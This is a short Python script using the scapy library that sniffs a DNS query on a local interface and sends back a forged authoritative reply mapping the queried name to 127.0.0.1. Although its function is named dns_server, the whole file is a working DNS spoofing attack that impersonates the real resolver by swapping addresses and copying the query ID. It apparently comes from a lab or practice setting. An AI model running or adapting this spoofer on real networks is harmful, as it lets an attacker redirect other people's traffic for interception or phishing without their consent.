
from scapy.all import *
import time
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import UDP, IP


def dns_server():

    pkt = sniff(filter="udp and port 53", count=1, iface="enp0s3")[0]

    print("Starting DNS server...")

    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
        UDP(dport=pkt[UDP].sport, sport=53)/\
        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata='127.0.0.1'))

        time.sleep(1)

        send(spoofed_pkt)

    else:
        print("there is no layer in pkt")

#sniff(filter="udp and port 53", prn=dns_server)


if __name__ == "__main__":
    dns_server()
